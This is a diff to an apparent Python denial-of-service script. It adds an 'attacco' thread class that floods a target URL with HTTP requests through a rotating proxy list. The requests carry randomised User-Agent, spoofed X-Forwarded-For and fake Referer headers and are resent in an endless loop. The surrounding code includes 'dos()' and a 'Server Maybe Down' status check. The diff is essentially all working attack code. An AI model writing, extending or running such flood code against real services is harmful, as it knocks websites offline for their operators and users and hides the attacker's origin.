@@ -94,7 +94,39 @@ def down_it(item):
 		print("\033[91m[!] No Connection ✓ Server Maybe Down\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
-
+		
+class attacco(threading.Thread):
+    def run(self):
+        current = x
+       
+        if current < len(listaproxy):
+            proxy = listaproxy[current].split(':')
+        else:
+            proxy = random.choice(listaproxy).split(':')
+ 
+        useragent = "User-Agent: " + randomUserAgent() + "\r\n"
+        forward   = "X-Forwarded-For: " + randomIpList() + "\r\n"
+        referer   = "Referer: "+ randomReFerer() + url + "?r="+ str(random.randint(1, 1000)) + "\r\n"
+        httprequest = get_host + useragent + referer + accept + forward + connection + "\r\n"
+ 
+        while nload:
+            time.sleep(1)
+           
+        while 1:
+            try:
+                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                a.connect((proxy[0], int(proxy[1])))
+                a.send(httprequest)
+                try:
+                    for i in xrange(3):
+                        a.send(httprequest)
+                except:
+                    tts = 1
+ 
+                   
+            except:
+                proxy = random.choice(listaproxy).split(':')
+ 
 
 def dos():
 	while True:
